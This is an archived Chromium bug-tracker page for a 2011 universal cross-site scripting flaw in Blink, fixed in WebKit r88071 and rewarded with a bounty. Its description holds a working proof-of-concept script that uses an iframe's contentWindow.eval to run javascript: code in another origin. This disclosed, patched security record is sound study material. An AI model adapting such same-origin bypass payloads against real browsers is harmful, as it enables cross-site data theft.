# Universal XSS using contentWindow.eval

| Field | Value |
|-------|-------|
| **Issue ID** | [40091229](https://issues.chromium.org/issues/40091229) |
| **Status** | Assigned |
| **Severity** | S3-Low |
| **Priority** | P1 |
| **Component** | Blink |
| **Reporter** | in...@chromium.org |
| **Assignee** | ab...@chromium.org |
| **Created** | 2011-05-24 |
| **Bounty** | $1,000.00 |

## Description

Testcase::
Here's the UXSS variation that doesn't use execScript:
<script>
i = document.body.appendChild(document.createElement("iframe"));
f = i.contentWindow.eval('(function(){location="javascript:alert(location)"})');
i.src = "http://google.com";
i.onload = f;
</script>

## Timeline

### in...@chromium.org (2011-05-24)

[Empty comment from Monorail migration]

### js...@chromium.org (2011-05-24)

From Serg's coment #30 in https://crbug.com/chromium/83096

> @jschuh it becomes a different-origin window after eval() is called.
> eval() is used to construct a function with the context of that window.


### js...@chromium.org (2011-05-24)

[Empty comment from Monorail migration]

### sc...@gmail.com (2011-06-01)

Any chance you can tackle this this week, Adam? :)

### ab...@chromium.org (2011-06-01)

Yes.  Sorry.  I got drafted into WebKit gardening.

### ab...@chromium.org (2011-06-03)

Committed r88071: <http://trac.webkit.org/changeset/88071>


### ab...@chromium.org (2011-06-03)

Let me know if you want me to merge the fix and to which branches.

### in...@chromium.org (2011-06-03)

Adam, you did the hard part. Please leave the easy easy part for us :):) We will merge it to m12 first patch and m13 branch.

### sc...@gmail.com (2011-06-04)

Merged to M12 at r88085 and M13 at r88086

### sc...@gmail.com (2011-06-04)

@serg.glazunov: great UXSS! We'll reward this separately from the execScript issue.
This is certainly worth a provisional $1000 Chromium Security Reward. Congrats!

By, we really like to fix UXSS issues so if you had any other clever ones, please submit them for additional reward :)

----
Boilerplate text:
Please do NOT publicly disclose details until a fix has been released to all our
users. Early public disclosure may cancel the provisional reward.
Also, please be considerate about disclosure when the bug affects a core library
that may be used by other products.
Please do NOT share this information with third parties who are not directly
involved in fixing the bug. Doing so may cancel the provisional reward.
Please be honest if you have already disclosed anything publicly or to third parties.
----

### sc...@gmail.com (2011-06-09)

Invoice finalized; payment is in e-payment system; it can take a couple of weeks.

### ke...@chromium.org (2011-09-22)

https://bugs.webkit.org/show_bug.cgi?id=62057

### js...@chromium.org (2011-10-05)

Batch update.

### js...@chromium.org (2012-04-18)

Lifting view restrictions.

### js...@chromium.org (2012-04-18)

[Empty comment from Monorail migration]

### bu...@chromium.org (2012-10-13)

This issue has been closed for some time. No one will pay attention to new comments.
If you are seeing this bug or have new data, please click New Issue to start a new bug.

### bu...@chromium.org (2013-03-10)

[Empty comment from Monorail migration]

### bu...@chromium.org (2013-03-13)

[Empty comment from Monorail migration]

### bu...@chromium.org (2013-03-21)

[Empty comment from Monorail migration]

### bu...@chromium.org (2013-03-21)

[Empty comment from Monorail migration]

### bu...@chromium.org (2013-04-06)

[Empty comment from Monorail migration]

### sh...@chromium.org (2016-10-01)

This bug has been closed for more than 14 weeks. Removing security view restrictions.

For more details visit https://www.chromium.org/issue-tracking/autotriage - Your friendly Sheriffbot

### sh...@chromium.org (2016-10-02)

This bug has been closed for more than 14 weeks. Removing security view restrictions.

For more details visit https://www.chromium.org/issue-tracking/autotriage - Your friendly Sheriffbot

### mb...@chromium.org (2016-10-02)

[Empty comment from Monorail migration]

### aw...@chromium.org (2018-04-26)

[Empty comment from Monorail migration]

### is...@google.com (2018-04-26)

This issue was migrated from crbug.com/chromium/83743?no_tracker_redirect=1

[Monorail blocking: crbug.com/chromium/83096]
[Monorail components added to Component Tags custom field.]

---
*Data from [Chromium Issue Tracker](https://issues.chromium.org/issues/40091229)*
